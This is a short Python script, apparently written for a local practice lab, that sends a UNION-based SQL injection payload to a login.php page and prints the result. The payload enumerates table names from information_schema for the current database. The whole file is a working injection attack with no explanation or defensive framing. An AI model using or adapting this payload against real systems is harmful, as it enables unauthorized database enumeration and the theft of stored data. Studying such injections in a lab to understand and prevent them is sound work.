import requests as r
 
url = 'http://localhost/sadboy/login.php'
 
payload = "?name=-1\&type= UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- -"
print(r.get(url,payload).text)
